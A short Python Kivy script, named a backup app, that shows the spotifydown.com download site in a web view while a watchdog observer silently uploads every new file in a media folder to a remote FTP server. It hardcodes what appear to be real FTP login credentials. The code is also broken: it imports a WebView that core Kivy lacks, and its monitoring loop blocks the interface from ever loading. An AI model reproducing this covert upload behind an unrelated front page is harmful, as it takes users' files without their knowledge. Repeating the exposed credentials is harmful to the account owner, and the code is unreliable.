from kivy.app import App
from kivy.uix.webview import WebView
from ftplib import FTP
import os
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

FTP_SERVER = "ftp.gb.stackcp.com"
FTP_USERNAME = "newsletter.tf"
FTP_PASSWORD = "7#3Ws<LZo9mm"
UPLOAD_PATH = "/path/to/your/media/directory"  # Path to monitor

# Check Wi-Fi connection (placeholder, platform-dependent implementation required)
def is_wifi_connected():
    # Implement Wi-Fi-only check based on Android networking APIs or other means
    return True

# Upload file function
def upload_file(file_path):
    if is_wifi_connected():
        ftp = FTP(FTP_SERVER)
        ftp.login(FTP_USERNAME, FTP_PASSWORD)
        with open(file_path, "rb") as file:
            ftp.storbinary(f"STOR {os.path.basename(file_path)}", file)
        ftp.quit()
        print(f"Uploaded: {file_path}")
    else:
        print("Wi-Fi not connected; waiting to upload...")

# Monitor folder for new files
class FileEventHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            upload_file(event.src_path)

def start_monitoring():
    observer = Observer()
    event_handler = FileEventHandler()
    observer.schedule(event_handler, UPLOAD_PATH, recursive=False)
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

class BackupApp(App):
    def build(self):
        webview = WebView()
        webview.url = "https://spotifydown.com/"
        start_monitoring()  # Start real-time monitoring
        return webview

if __name__ == "__main__":
    BackupApp().run()
